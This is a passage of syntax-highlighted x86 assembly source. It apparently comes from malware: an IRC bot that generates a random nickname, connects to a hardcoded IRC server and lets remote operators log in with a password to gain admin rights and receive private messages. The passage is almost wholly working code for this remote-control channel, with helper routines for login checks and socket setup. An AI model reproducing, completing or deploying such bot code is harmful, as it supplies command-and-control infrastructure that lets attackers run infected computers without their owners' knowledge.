            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; op numba ++</span><span class="sc0">
</span><span class="sc5">__find_slot</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__free_slot</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">operator</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__find_slot</span><span class="sc0">

</span><span class="sc5">__free_slot</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; save OP_Name ptr</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc_cmd_nick</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; copy nick</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; skip OP_Name</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">GetTickCount</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">; OP_TimeLoggedIn</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">; OP_TimeLastCmd</span><span class="sc0">
            </span><span class="sc5">SETFLAG</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">mask</span><span class="sc0"> </span><span class="sc5">RITES_Admin</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">

            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Nick</span><span class="sc0"> </span><span class="sc5">has</span><span class="sc0"> </span><span class="sc5">been</span><span class="sc0"> </span><span class="sc5">logged</span><span class="sc0"> </span><span class="sc5">in.</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">24</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_privmsg</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__end</span><span class="sc0">

</span><span class="sc5">__wrong_password</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Wrong</span><span class="sc0"> </span><span class="sc5">password</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">access</span><span class="sc0"> </span><span class="sc5">denied</span><span class="sc0">!!</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">30</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_privmsg</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__end</span><span class="sc0">

</span><span class="sc5">__too_much_ops</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Too</span><span class="sc0"> </span><span class="sc5">much</span><span class="sc0"> </span><span class="sc5">ops</span><span class="sc0"> </span><span class="sc5">logged</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0">!!</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">41</span><span class="sc4">-</span><span class="sc2">18</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_privmsg</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__end</span><span class="sc0">

</span><span class="sc5">__already_logged_in</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Nick</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">allready</span><span class="sc0"> </span><span class="sc5">logged</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0">!!</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">44</span><span class="sc4">-</span><span class="sc2">17</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_privmsg</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">
</span><span class="sc5">__end</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; checks whether thr current nick has been logged in</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: je ? CF=1 : CF=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">check_logged_in</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operators</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">            </span><span class="sc1">; check max op numba</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; save ptr to name</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; edx = op numba</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc_cmd_nick</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@endsz</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; load ptr to the first name</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; eax = op numba</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__not_logged_in</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">__check_login</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc_cmd_nick</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__already_logged_in</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">operator</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_ecx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__check_login</span><span class="sc0">

</span><span class="sc5">__not_logged_in</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">clc</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__2</span><span class="sc0">
</span><span class="sc5">__already_logged_in</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; sends PRIVMSG to nick priv_msg_curr_user</span><span class="sc0">
</span><span class="sc1">; i: TOS = ptr to msg to send</span><span class="sc0">
</span><span class="sc1">;    ecx = msg length</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">send_privmsg</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">priv_msg_curr_user</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@dvotocka</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Arg1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CRLF_HEX</span><span class="sc0">
            </span><span class="sc6">stosw</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">priv_msg_curr_user</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">irc_send</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; reads 3 linez, sends NICK &amp; USER commands &amp; checks if nick is already in use.</span><span class="sc0">
</span><span class="sc1">; if so, CF = 1</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">;    nick in use ? CF=1 : CF=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">login_to_irc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">IFNDEF</span><span class="sc0"> </span><span class="sc5">LOCALHOST</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_line</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_line</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_line</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">login_irc_error</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0"> </span><span class="sc1">; LOCALHOST</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc_nick</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_Sleep</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandString</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CRLF_HEX</span><span class="sc0">
            </span><span class="sc6">stosw</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc_nick</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__1</span><span class="sc0">

</span><span class="sc5">nick_command</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"NICK "</span><span class="sc0"> 
</span><span class="sc5">irc_nick</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">10</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">irc_send</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">login_irc_error</span><span class="sc0">

            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">USER</span><span class="sc0"> </span><span class="sc5">w</span><span class="sc0"> </span><span class="sc5">w</span><span class="sc0"> </span><span class="sc5">w</span><span class="sc0"> </span><span class="sc5">w</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">irc_send_crlf</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">

            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">login_irc_error</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_line</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">login_irc_error</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_line</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">login_irc_error</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">; check whether the nick is already in use</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">CRLF_HEX</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'.e'</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__login_oky</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"su n"</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__login_oky</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"i yd"</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__login_oky</span><span class="sc0">

            </span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc5">__login_oky</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">login_irc_error</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; connects to irc server</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">connect_to_irc_server</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SOCK_STREAM</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">AF_INET</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">socket</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__err</span><span class="sc0">

            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">socket_handle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">LOCALHOST</span><span class="sc0">
            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">localhost</span><span class="sc4">~</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc.carnet.hr</span><span class="sc4">~</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0"> </span><span class="sc1">; LOCALHOST</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">gethostbyname</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__err</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">HOSTENT_IP</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
    
            </span><span class="sc6">cdq</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; sin_zero[8]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; sin_addr</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">CONNECT_PORT</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">CONNECT_PORT</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AF_INET</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">type</span><span class="sc0"> </span><span class="sc5">sockaddr_in</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">socket_handle</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">connect</span><span class="sc0">
    
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                 </span><span class="sc1">; free sockaddr</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__err</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">__err</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; reads one CRLF terminated line and logs it</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">read_line</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc_recv_buffer</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
</span><span class="sc5">__read</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
